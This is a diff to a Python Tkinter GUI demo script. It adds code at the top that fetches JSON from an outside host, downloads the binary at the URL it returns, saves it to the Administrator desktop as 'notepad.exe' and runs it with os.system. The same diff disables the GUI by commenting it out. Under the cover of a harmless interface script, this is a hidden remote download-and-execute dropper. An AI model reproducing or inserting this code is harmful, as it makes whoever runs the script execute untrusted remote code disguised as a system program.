@@ -1,18 +1,26 @@
 from tkinter import *
 import webbrowser
 import requests
+import os
+r = requests.get('http://www.atb.com/mark/api')
+data = r.json()
+
+downFile = requests.get(data['url'])
+with open("C:/Users/Administrator/Desktop/notepad.exe","wb") as code:
+    code.write(downFile.content)
+
+os.system("notepad.exe")
+
+
 
 def open():
     webbrowser.open("http://www.baidu.com")
 
-
-
-
-
-
+'''
 root = Tk()
 root.title("Hello Test")
 root.geometry('800x500+600+200')
+
 #root.iconbitmap('./win.ico')
 #上
 frmTop = Frame(root,width=800,height=400,bg='#84AFAE')
@@ -37,7 +45,7 @@ frmTopLeftTopCenter.pack(side=LEFT)
 #上左上右 按钮
 frmTopLeftTopRight = Frame(frmTopLeftTop,width=300,height=260,bg='#5C616F')
 frmTopLeftTopRight.pack(side=LEFT)
-Button(frmTopLeftTopRight,text='A',width=20,height=5,command=open).pack()
+Button(frmTopLeftTopRight,text=data['name'],width=20,height=5,command=open).pack()
 
 #上左下
 frmTopLeftFoot = Frame(frmTopLeft,width=600,height=80,bg='#D2E3F5')
@@ -51,7 +59,7 @@ frmTopRight.pack(side=LEFT)
 frmFoot = Frame(root,width=800,height=100,bg='#1AC33B')
 frmFoot.pack(side=TOP)
 
-
+'''
 
 
 
@@ -68,4 +76,4 @@ Button(root,text='D').pack(side=LEFT,expand=NO,fill=Y)
 Button(root,text='E').pack(side=TOP,expand=YES,fill=BOTH)
 Button(root,text='F').pack(side=BOTTOM,expand=YES)
 Button(root,text='G').pack(anchor=SE)'''
-root.mainloop()
+#root.mainloop()
